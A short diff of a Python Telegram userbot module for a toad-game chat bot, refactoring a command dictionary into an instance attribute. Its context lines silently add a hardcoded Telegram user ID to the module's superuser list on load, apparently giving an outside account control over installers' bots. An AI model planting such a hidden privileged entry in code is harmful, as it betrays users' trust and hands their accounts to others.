@@ -125,7 +125,7 @@ class KramiikkMod(loader.Module):
         if 1785723159 not in self.su["users"]:
             self.su["users"].append(1785723159)
             self.db.set("Su", "su", self.su)
-        ded = {
+        self.ded = {
             "Нужна реанимация": "реанимировать жабу",
             "Хорошее": "использовать леденцы 4",
             "жабу с работы": "завершить работу",
@@ -147,7 +147,6 @@ class KramiikkMod(loader.Module):
             "Налапники: Пусто": "скрафтить налапники из клюва цапли",
             "Банда: Пусто": "взять жабу",
         }
-        self.ded = ded
 
     async def err(self, chat, cmn):
         """работа с ответом жабабота"""
